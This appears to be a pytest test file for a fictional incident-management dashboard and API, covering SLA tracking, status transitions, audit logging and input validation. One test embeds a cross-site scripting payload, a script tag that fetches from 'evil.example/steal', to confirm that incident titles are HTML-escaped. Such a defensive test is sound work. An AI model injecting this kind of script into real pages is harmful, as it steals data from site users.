def test_health_declares_portfolio_boundary(client):
    response = client.get("/health")
    assert response.status_code == 200
    assert "fictional" in response.json()["data_boundary"]


def test_dashboard_is_recruiter_evaluable(client):
    response = client.get("/")
    assert response.status_code == 200
    assert "Service Operations Command Center" in response.text
    assert "Priority queue" in response.text


def test_create_incident_calculates_sla_and_actor(client):
    response = client.post(
        "/api/incidents",
        headers={"X-Actor": "test-reviewer"},
        json={"title": "Payment gateway response degraded", "service": "payments", "severity": "critical"},
    )
    assert response.status_code == 201
    body = response.json()
    assert body["status"] == "open"
    assert body["updated_by"] == "test-reviewer"
    assert body["sla_due_at"] > body["created_at"]


def test_invalid_status_transition_is_rejected(client):
    incident = client.post(
        "/api/incidents",
        json={"title": "Search response time elevated", "service": "search", "severity": "medium"},
    ).json()
    response = client.patch(f"/api/incidents/{incident['id']}/status", json={"status": "resolved"})
    assert response.status_code == 409


def test_assignment_is_attributable_and_audited(client):
    incident = client.post(
        "/api/incidents",
        json={"title": "Reporting export is delayed", "service": "reporting", "severity": "low"},
    ).json()
    response = client.patch(
        f"/api/incidents/{incident['id']}/owner",
        headers={"X-Actor": "operations-lead"},
        json={"owner": "sam"},
    )
    assert response.status_code == 200
    assert response.json()["owner"] == "sam"
    events = client.get("/api/audit-events").json()
    assert events[0]["event"] == "incident.owner_assigned"
    assert events[0]["actor"] == "operations-lead"


def test_priority_queue_places_breached_work_first(client):
    response = client.get("/api/incidents/priority-queue")
    assert response.status_code == 200
    queue = response.json()
    assert [item["title"] for item in queue] == [
        "Checkout latency above target",  # high, 6h old, SLA 4h -> breached
        "Delayed inventory synchronization",
        "Customer portal image unavailable",
    ]
    assert [item["breached"] for item in queue] == [True, False, False]


def test_metrics_expose_workload(client):
    metrics = client.get("/api/metrics").json()
    assert metrics == {"total": 3, "open": 3, "breached": 1, "resolved": 0, "unassigned": 1}


def test_dashboard_escapes_incident_title(client):
    """A malicious title must render as inert text, not execute as HTML."""
    payload = "<script>fetch('//evil.example/steal')</script> latency spike"
    client.post(
        "/api/incidents",
        json={"title": payload, "service": "payments", "severity": "low"},
    )
    response = client.get("/")
    assert "<script>fetch" not in response.text
    assert "&lt;script&gt;" in response.text


def test_owner_cannot_be_reassigned_on_resolved_incident(client):
    incident = client.post(
        "/api/incidents",
        json={"title": "Cache warm-up delayed", "service": "search", "severity": "low"},
    ).json()
    client.patch(f"/api/incidents/{incident['id']}/status", json={"status": "investigating"})
    client.patch(f"/api/incidents/{incident['id']}/status", json={"status": "resolved"})

    response = client.patch(
        f"/api/incidents/{incident['id']}/owner",
        json={"owner": "sam"},
    )
    assert response.status_code == 409


VALID = {"title": "Payment gateway response degraded", "service": "payments", "severity": "critical"}


def test_blank_title_service_and_owner_are_rejected(client):
    for field, value in (("title", "     "), ("service", "  "), ("owner", ""), ("owner", "   ")):
        response = client.post("/api/incidents", json={**VALID, field: value})
        assert response.status_code == 422, (field, value)


def test_blank_owner_change_is_rejected(client):
    created = client.post("/api/incidents", json=VALID).json()
    response = client.patch(f"/api/incidents/{created['id']}/owner", json={"owner": "  "})
    assert response.status_code == 422


def test_title_is_stripped_when_valid(client):
    response = client.post("/api/incidents", json={**VALID, "title": "  Padded title here  "})
    assert response.status_code == 201
    assert response.json()["title"] == "Padded title here"


def test_overlong_actor_header_is_rejected_and_normal_one_accepted(client):
    too_long = client.post("/api/incidents", headers={"X-Actor": "a" * 65}, json=VALID)
    assert too_long.status_code == 422
    ok = client.post("/api/incidents", headers={"X-Actor": "a" * 64}, json=VALID)
    assert ok.status_code == 201
